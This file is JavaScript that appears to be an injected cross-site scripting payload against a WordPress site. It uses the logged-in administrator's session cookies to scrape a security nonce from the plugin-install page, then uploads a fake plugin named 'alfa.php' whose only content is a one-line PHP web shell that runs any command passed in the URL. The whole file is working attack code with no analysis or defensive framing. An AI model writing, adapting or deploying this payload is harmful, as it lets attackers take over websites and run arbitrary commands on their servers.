const headersConfig = {
	'Cookie': document.cookie,
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36 OPR/74.0.3911.218'
};

async function fetchPluginInstall(){
	const config = {
		method: 'GET',
		headers: headersConfig,
		mode: 'cors'
	};

	return await fetch('/noticias/wp-admin/plugin-install.php', config).then(async(response)=> await response.text());
};

async function postUploadPlugin(wpNonce){
	const body = `Content-Disposition: form-data; name="_wpnonce"

${wpNonce}
-----------------------------217883111019765372172657082207
Content-Disposition: form-data; name="_wp_http_referer"

/wp-admin/plugin-install.php
-----------------------------217883111019765372172657082207
Content-Disposition: form-data; name="pluginzip"; filename="alfa.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']);?>
-----------------------------217883111019765372172657082207
Content-Disposition: form-data; name="install-plugin-submit"

Instalar agora
-----------------------------217883111019765372172657082207--`;

	const config = {
		method: 'POST',
		headers: headersConfig,
		body,
		mode: 'cors'
	};

	return await fetch('/noticias/wp-admin/plugin-install.php', config).then(async(response)=> await response.text());
}

async function load(){
	const response = await fetchPluginInstall().catch(() => undefined);
	if(!response) return;

	const wpNonce = response.split('name="_wpnonce" value="')[1].split('"')[0];
	return await postUploadPlugin(wpNonce);
};

load(); //Load injection